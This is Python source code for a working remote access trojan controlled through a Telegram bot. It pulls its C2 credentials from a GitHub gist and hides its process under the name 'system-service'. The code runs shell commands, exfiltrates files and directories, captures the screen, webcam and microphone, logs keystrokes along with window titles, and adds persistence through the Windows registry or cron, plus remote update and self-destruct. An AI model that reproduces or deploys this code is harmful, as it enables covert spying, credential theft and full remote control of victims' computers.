import requests
import platform
import shutil
import psutil
import time
from datetime import datetime
import socket
import sys
import os
import random
import json
import base64
from retry import retry
import threading
import tempfile
import zipfile
import numpy as np

try:
    import setproctitle
    setproctitle.setproctitle("system-service")
except ImportError:
    pass

MSS_INSTALLED = False
try:
    from mss import mss
    MSS_INSTALLED = True
except ImportError:
    pass

PYNPUT_INSTALLED = False
try:
    from pynput.keyboard import Key, Listener
    PYNPUT_INSTALLED = True
except ImportError:
    pass

CV2_INSTALLED = False
try:
    import cv2
    CV2_INSTALLED = True
except ImportError:
    pass

SOUNDDEVICE_INSTALLED = False
try:
    import sounddevice as sd
    from scipy.io.wavfile import write as write_wav
    SOUNDDEVICE_INSTALLED = True
except ImportError:
    pass

if platform.system() == "Windows":
    try:
        import win32gui
    except ImportError:
        pass
elif platform.system() == "Linux":
    try:
        from Xlib import display
    except ImportError:
        pass

SERVER_URL = base64.b64decode(b'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnLw==').decode('utf-8')
CONFIG_FILE = 'scan_config.txt'
KEYLOG_FILE = 'keylog.txt'

keylogger_listener = None
keylogger_thread = None
stream_screen_flag = False
stream_screen_thread = None
last_window_title = None

def load_or_generate_target_id():
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r') as f:
                config = json.load(f)
                return config.get('target_id')
        target_id = ''.join([str(random.randint(0, 9)) for _ in range(14)])
        config = {'target_id': target_id}
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f)
        return target_id
    except Exception:
        return None

C2_URL = "https://gist.githubusercontent.com/TAI-Sec/86f9b2c98816541f1215816bbabdc134/raw/f5ad01770769a0511bcb1e3c7d0d7a5eb55a0e2a/c2_config.json"

def get_credentials_from_c2():
    try:
        response = requests.get(C2_URL)
        config = response.json()
        token = config['BOT_TOKEN']
        chat_id = config['CHAT_ID']
        return token, chat_id
    except Exception:
        return None, None

def get_network_info():
    try:
        response = requests.get("http://ip-api.com/json")
        if response.status_code == 200:
            data = response.json()
            return {
                'IP Address': data.get('query', 'Unknown'),
                'Country': data.get('country', 'Unknown'),
                'City': data.get('city', 'Unknown'),
                'ISP': data.get('isp', 'Unknown'),
            }
    except Exception:
        pass
    return {}

def get_system_info():
    try:
        info = {
            'System': platform.platform(),
            'Node Name': socket.gethostname(),
            'Release': platform.release(),
            'Version': platform.version(),
            'Machine': platform.machine(),
            'Processor': platform.processor() or 'Unknown',
            'Timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        info.update(get_network_info())
        try:
            info['CPU Cores'] = psutil.cpu_count(logical=True)
            info['CPU Usage'] = f"{psutil.cpu_percent(interval=1)}%"
            info['Memory'] = f"{psutil.virtual_memory().percent}% used"
        except Exception:
            pass
        try:
            total, used, free = shutil.disk_usage(".")
            info['Disk Total'] = f"{total // (2**30)} GB"
            info['Disk Used'] = f"{used // (2**30)} GB"
            info['Disk Free'] = f"{free // (2**30)} GB"
        except Exception:
            pass
        return info
    except Exception:
        return None

def format_info_text(info):
    if not info:
        return "Error: Could not collect scan data"
    formatted = ["<b>Scan Report</b>", "="*25]
    for key, value in info.items():
        formatted.append(f"<b>{key}:</b> {value}")
    return "\n".join(formatted)

@retry(tries=3, delay=2, backoff=2)
def send_report(token, chat_id, message, file_path=None):
    try:
        if file_path:
            endpoint = f"{SERVER_URL}bot{token}/sendDocument"
            with open(file_path, 'rb') as f:
                files = {'document': f}
                data = {'chat_id': chat_id, 'caption': message, 'parse_mode': 'HTML'}
                response = requests.post(endpoint, files=files, data=data)
        else:
            endpoint = f"{SERVER_URL}bot{token}/sendMessage"
            data = {'chat_id': chat_id, 'text': message, 'parse_mode': 'HTML'}
            response = requests.post(endpoint, data=data)
        
        if response.status_code == 200:
            return True
        else:
            return False
    except Exception:
        return False

def execute_command(command):
    try:
        import subprocess
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout or result.stderr or "No output"
        return output
    except Exception as e:
        return f"Error: {str(e)}"

def get_resource(path, token, chat_id, target_id):
    try:
        if os.path.isdir(path):
            for item in os.listdir(path):
                item_path = os.path.join(path, item)
                if os.path.isfile(item_path):
                    send_report(token, chat_id, f"File from {target_id}: {item_path}", item_path)
            return f"Finished sending contents of {path}"
        elif os.path.isfile(path):
            send_report(token, chat_id, f"File from {target_id}: {path}", path)
            return f"Finished sending file {path}"
        else:
            return f"Error: {path} not found"
    except Exception as e:
        return f"Error: {str(e)}"

def zip_dir(path):
    try:
        zip_path = os.path.join(tempfile.gettempdir(), f"{os.path.basename(path)}.zip")
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(path):
                for file in files:
                    zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), os.path.join(path, '..')))
        return zip_path, None
    except Exception as e:
        return None, f"Error: {str(e)}"

@retry(tries=3, delay=2, backoff=2)
def fetch_commands(token, chat_id, target_id, offset):
    try:
        endpoint = f"{SERVER_URL}bot{token}/getUpdates"
        params = {'offset': offset, 'timeout': 30}
        response = requests.get(endpoint, params=params)
        if response.status_code == 200:
            data = response.json()
            if data.get('ok') and data.get('result'):
                return data['result'], max([update['update_id'] for update in data['result']] + [offset]) + 1
        return [], offset
    except Exception:
        return [], offset

def get_help_message():
    return """
<b>Available Commands:</b>
/help - Show this help message
/ping &lt;target_id|all&gt; - Check if target(s) are active
/run &lt;target_id&gt; &lt;command&gt; - Execute a shell command
/get &lt;target_id&gt; &lt;path&gt; - Get a file or all files in a directory
/getzip &lt;target_id&gt; &lt;path&gt; - Get a directory as a zip file
/screenshot &lt;target_id&gt; - Take a screenshot
/webcam_snap &lt;target_id&gt; &lt;front|back&gt; - Take a webcam snapshot
/mic_record &lt;target_id&gt; &lt;seconds&gt; - Record microphone audio
/record_screen &lt;target_id&gt; &lt;seconds&gt; - Record screen
/stream_start &lt;target_id&gt; - Start live screen streaming
/stream_stop &lt;target_id&gt; - Stop live screen streaming
/upload &lt;target_id&gt; - Upload a file (reply to a file with this command)
/destroy &lt;target_id&gt; - Self-destruct
/k_start &lt;target_id&gt; - Start the keylogger
/k_stop &lt;target_id&gt; - Stop the keylogger
/k_get &lt;target_id&gt; - Get keylogger logs
/k_clear &lt;target_id&gt; - Clear keylogger logs
/lock &lt;target_id&gt; - Make the script persistent
/update &lt;target_id&gt; &lt;url&gt; - Update the script from a URL
"""

def take_screenshot():
    if not MSS_INSTALLED:
        return None, "MSS library not installed."
    try:
        with mss() as sct:
            filename = os.path.join(tempfile.gettempdir(), f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
            sct.shot(output=filename)
            return filename, None
    except Exception as e:
        return None, f"Error: {str(e)}"

def webcam_snap(camera_index=0):
    if not CV2_INSTALLED:
        return None, "OpenCV not installed."
    try:
        cap = cv2.VideoCapture(camera_index)
        if not cap.isOpened():
            return None, "Cannot open camera."
        ret, frame = cap.read()
        cap.release()
        if not ret:
            return None, "Cannot read frame."
        filename = os.path.join(tempfile.gettempdir(), f"webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg")
        cv2.imwrite(filename, frame)
        return filename, None
    except Exception as e:
        return None, f"Error: {str(e)}"

def mic_record(duration):
    if not SOUNDDEVICE_INSTALLED:
        return None, "Sounddevice not installed."
    try:
        fs = 44100
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
        sd.wait()
        filename = os.path.join(tempfile.gettempdir(), f"mic_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav")
        write_wav(filename, fs, recording)
        return filename, None
    except Exception as e:
        return None, f"Error: {str(e)}"

def screen_record(duration):
    if not CV2_INSTALLED or not MSS_INSTALLED:
        return None, "OpenCV or MSS not installed."
    try:
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        filename = os.path.join(tempfile.gettempdir(), f"screen_{datetime.now().strftime('%Y%m%d_%H%M%S')}.avi")
        with mss() as sct:
            monitor = sct.monitors[1]
            out = cv2.VideoWriter(filename, fourcc, 10.0, (monitor["width"], monitor["height"]))
            start_time = time.time()
            while (time.time() - start_time) < duration:
                img = np.array(sct.grab(monitor))
                frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
                out.write(frame)
            out.release()
        return filename, None
    except Exception as e:
        return None, f"Error: {str(e)}"

def stream_screen_worker(token, chat_id, target_id):
    global stream_screen_flag
    with mss() as sct:
        monitor = sct.monitors[1]
        while stream_screen_flag:
            try:
                img = np.array(sct.grab(monitor))
                frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
                filename = os.path.join(tempfile.gettempdir(), "stream.jpg")
                cv2.imwrite(filename, frame, [int(cv2.IMWRITE_JPEG_QUALITY), 80])
                send_report(token, chat_id, f"Live from {target_id}", filename)
                os.remove(filename)
                time.sleep(1)
            except Exception as e:
                time.sleep(5)

def start_stream_screen(token, chat_id, target_id):
    global stream_screen_flag, stream_screen_thread
    if not stream_screen_flag:
        stream_screen_flag = True
        stream_screen_thread = threading.Thread(target=stream_screen_worker, args=(token, chat_id, target_id), daemon=True)
        stream_screen_thread.start()
        return "Screen streaming started."
    return "Screen streaming is already running."

def stop_stream_screen():
    global stream_screen_flag
    if stream_screen_flag:
        stream_screen_flag = False
        return "Screen streaming stopped."
    return "Screen streaming is not running."

def get_active_window_title():
    try:
        if platform.system() == "Windows":
            return win32gui.GetWindowText(win32gui.GetForegroundWindow())
        elif platform.system() == "Linux":
            d = display.Display()
            root = d.screen().root
            window_id = root.get_full_property(d.intern_atom('_NET_ACTIVE_WINDOW'), display.X.AnyPropertyType).value[0]
            window = d.create_resource_object('window', window_id)
            return window.get_wm_name()
    except Exception:
        return "Unknown"

def on_press(key):
    global last_window_title
    window_title = get_active_window_title()
    with open(KEYLOG_FILE, "a") as f:
        if window_title != last_window_title:
            f.write(f"\n\n[ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {window_title} ]\n")
            last_window_title = window_title
        
        key_str = str(key).replace("'", "")
        if "Key." in key_str:
            f.write(f" [{key_str.split('.')[1].upper()}] ")
        else:
            f.write(key_str)

def usb_monitor_worker(token, chat_id, target_id):
    known_devices = set(p.device for p in psutil.disk_partitions())
    while True:
        try:
            current_devices = set(p.device for p in psutil.disk_partitions())
            new_devices = current_devices - known_devices
            removed_devices = known_devices - current_devices

            for device in new_devices:
                details = psutil.disk_usage(device)
                message = f"<b>USB Device Plugged In on {target_id}</b>\n"
                message += f"Device: {device}\n"
                message += f"Total: {details.total // (1024**3)} GB\n"
                message += f"Used: {details.used // (1024**3) } GB\n"
                message += f"Free: {details.free // (1024**3)} GB"
                send_report(token, chat_id, message)
            
            for device in removed_devices:
                send_report(token, chat_id, f"<b>USB Device Unplugged on {target_id}</b>\nDevice: {device}")

            known_devices = current_devices
            time.sleep(10)
        except Exception:
            time.sleep(30)

def download_file(token, file_id, destination):
    try:
        endpoint = f"{SERVER_URL}bot{token}/getFile"
        params = {'file_id': file_id}
        response = requests.get(endpoint, params=params)
        if response.status_code == 200:
            file_path = response.json()['result']['file_path']
            file_url = f"{SERVER_URL}file/bot{token}/{file_path}"
            with requests.get(file_url, stream=True) as r:
                r.raise_for_status()
                with open(destination, 'wb') as f:
                    for chunk in r.iter_content(chunk_size=8192):
                        f.write(chunk)
            return True
    except Exception:
        return False

def self_destruct(target_id):
    try:
        script_path = os.path.abspath(__file__)
        with tempfile.NamedTemporaryFile(delete=False, mode='w', suffix=".bat" if platform.system() == "Windows" else ".sh") as f:
            if platform.system() == "Windows":
                f.write(f"""
@echo off
timeout /t 3 /nobreak > NUL
del "{script_path}"
del "{CONFIG_FILE}"
del "{KEYLOG_FILE}"
del "scan_log.txt"
del "%~f0"
""")
                os.startfile(f.name)
            else:
                f.write(f"""
#!/bin/bash
sleep 3
rm -f "{script_path}"
rm -f "{CONFIG_FILE}"
rm -f "{KEYLOG_FILE}"
rm -f "$0"
""")
                os.system(f"chmod +x {f.name} && {f.name} &")
        sys.exit(0)
    except Exception:
        pass

def keylogger_main():
    global keylogger_listener
    with Listener(on_press=on_press) as listener:
        keylogger_listener = listener
        listener.join()

def start_keylogger():
    if not PYNPUT_INSTALLED:
        return "pynput library not installed."
    global keylogger_thread
    if keylogger_thread is None or not keylogger_thread.is_alive():
        keylogger_thread = threading.Thread(target=keylogger_main, daemon=True)
        keylogger_thread.start()
        return "Keylogger started."
    return "Keylogger is already running."

def stop_keylogger():
    global keylogger_listener
    if keylogger_listener:
        keylogger_listener.stop()
        return "Keylogger stopped."
    return "Keylogger is not running."

def lock_persistence():
    try:
        script_path = os.path.abspath(__file__)
        if platform.system() == "Windows":
            import winreg
            key = winreg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "SystemScanService", 0, winreg.REG_SZ, f'"{sys.executable}" "{script_path}"')
            return "Persistence enabled for Windows."
        elif platform.system() == "Linux":
            if "com.termux" in os.environ.get("PREFIX", ""):
                return "Persistence on Termux requires manual setup with termux-boot."
            else:
                cron_job = f"@reboot {sys.executable} {script_path}\n"
                os.system(f'(crontab -l 2>/dev/null; echo "{cron_job}") | crontab -')
                return "Persistence enabled for Linux."
        else:
            return "Persistence not supported on this OS."
    except Exception as e:
        return f"Error: {str(e)}"

def update_script(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            with open(__file__, 'w') as f:
                f.write(response.text)
            os.execv(sys.executable, ['python'] + sys.argv)
        else:
            return "Failed to download update."
    except Exception as e:
        return f"Error: {str(e)}"

def main():
    target_id = load_or_generate_target_id()
    if not target_id:
        sys.exit(1)
    
    token, chat_id = get_credentials_from_c2()
    if not token or not chat_id:
        sys.exit(1)
    
    usb_thread = threading.Thread(target=usb_monitor_worker, args=(token, chat_id, target_id), daemon=True)
    usb_thread.start()

    system_info = get_system_info()
    info_text = f"<b>New scan target online: {target_id}</b>\n"
    info_text += format_info_text(system_info)
    if not MSS_INSTALLED:
        info_text += "\n\nWarning: mss library not installed. Screenshot feature disabled."
    if not PYNPUT_INSTALLED:
        info_text += "\nWarning: pynput library not installed. Keylogger feature disabled."
    
    send_report(token, chat_id, info_text)
    
    offset = 0
    
    while True:
        try:
            updates, offset = fetch_commands(token, chat_id, target_id, offset)
            for update in updates:
                if 'message' in update:
                    message = update['message']
                    text = message.get('text', '')
                    
                    if text.startswith('/'):
                        parts = text.split(maxsplit=2)
                        command = parts[0]
                        cmd_target_id = parts[1] if len(parts) > 1 else None

                        if command == '/help':
                            send_report(token, chat_id, get_help_message())
                            continue

                        if cmd_target_id != target_id and cmd_target_id != 'all':
                            continue

                        if command == '/ping':
                            send_report(token, chat_id, f"Target {target_id} is active.")
                        elif command == '/run' and len(parts) > 2:
                            cmd = parts[2]
                            output = execute_command(cmd)
                            send_report(token, chat_id, f"Command result for {target_id}:\n{output}")
                        elif command == '/get' and len(parts) > 2:
                            path = parts[2]
                            if path.startswith('ls '):
                                path = path[3:]
                            result = get_resource(path, token, chat_id, target_id)
                            send_report(token, chat_id, result)
                        elif command == '/getzip' and len(parts) > 2:
                            path = parts[2]
                            zip_path, error_msg = zip_dir(path)
                            if zip_path:
                                send_report(token, chat_id, f"Zipped directory from {target_id}: {path}", zip_path)
                                os.remove(zip_path)
                            else:
                                send_report(token, chat_id, error_msg or f"Failed to zip directory on {target_id}")
                        elif command == '/screenshot':
                            screenshot_file, error_msg = take_screenshot()
                            if screenshot_file:
                                send_report(token, chat_id, f"Screenshot from {target_id}", screenshot_file)
                                os.remove(screenshot_file)
                            else:
                                send_report(token, chat_id, error_msg or f"Failed to take screenshot on {target_id}")
                        elif command == '/webcam_snap' and len(parts) > 2:
                            camera = parts[2].lower()
                            camera_index = 1 if camera == 'back' else 0
                            filename, error_msg = webcam_snap(camera_index)
                            if filename:
                                send_report(token, chat_id, f"Webcam snap from {target_id}", filename)
                                os.remove(filename)
                            else:
                                send_report(token, chat_id, error_msg or f"Failed to take webcam snap on {target_id}")
                        elif command == '/mic_record' and len(parts) > 2:
                            try:
                                duration = int(parts[2])
                                filename, error_msg = mic_record(duration)
                                if filename:
                                    send_report(token, chat_id, f"Mic recording from {target_id}", filename)
                                    os.remove(filename)
                                else:
                                    send_report(token, chat_id, error_msg or f"Failed to record mic on {target_id}")
                            except ValueError:
                                send_report(token, chat_id, "Invalid duration for /mic_record")
                        elif command == '/record_screen' and len(parts) > 2:
                            try:
                                duration = int(parts[2])
                                filename, error_msg = screen_record(duration)
                                if filename:
                                    send_report(token, chat_id, f"Screen recording from {target_id}", filename)
                                    os.remove(filename)
                                else:
                                    send_report(token, chat_id, error_msg or f"Failed to record screen on {target_id}")
                            except ValueError:
                                send_report(token, chat_id, "Invalid duration for /record_screen")
                        elif command == '/stream_start':
                            result = start_stream_screen(token, chat_id, target_id)
                            send_report(token, chat_id, f"{result} on {target_id}")
                        elif command == '/stream_stop':
                            result = stop_stream_screen()
                            send_report(token, chat_id, f"{result} on {target_id}")
                        elif command == '/upload':
                            if 'reply_to_message' in message and 'document' in message['reply_to_message']:
                                file_info = message['reply_to_message']['document']
                                file_id = file_info['file_id']
                                file_name = file_info['file_name']
                                if download_file(token, file_id, file_name):
                                    send_report(token, chat_id, f"File '{file_name}' uploaded to {target_id}")
                                else:
                                    send_report(token, chat_id, f"Failed to upload file to {target_id}")
                            else:
                                send_report(token, chat_id, "To upload, reply to a file with /upload")
                        elif command == '/destroy':
                            send_report(token, chat_id, f"Self-destructing on {target_id}...")
                            self_destruct(target_id)
                        elif command == '/k_start':
                            result = start_keylogger()
                            send_report(token, chat_id, f"{result} on {target_id}")
                        elif command == '/k_stop':
                            result = stop_keylogger()
                            send_report(token, chat_id, f"{result} on {target_id}")
                        elif command == '/k_get':
                            if os.path.exists(KEYLOG_FILE):
                                send_report(token, chat_id, f"Keylogger logs from {target_id}", KEYLOG_FILE)
                            else:
                                send_report(token, chat_id, f"No keylogger logs found on {target_id}")
                        elif command == '/k_clear':
                            if os.path.exists(KEYLOG_FILE):
                                os.remove(KEYLOG_FILE)
                                send_report(token, chat_id, f"Keylogger logs cleared on {target_id}")
                            else:
                                send_report(token, chat_id, f"No keylogger logs to clear on {target_id}")
                        elif command == '/lock':
                            result = lock_persistence()
                            send_report(token, chat_id, f"{result} on {target_id}")
                        elif command == '/update' and len(parts) > 2:
                            url = parts[2]
                            send_report(token, chat_id, f"Updating script on {target_id} from {url}...")
                            result = update_script(url)
                            if result:
                                send_report(token, chat_id, result)
        
        except KeyboardInterrupt:
            print("Scan stopped")
            sys.exit(0)
        except Exception:
            time.sleep(5)

if __name__ == "__main__":
    main()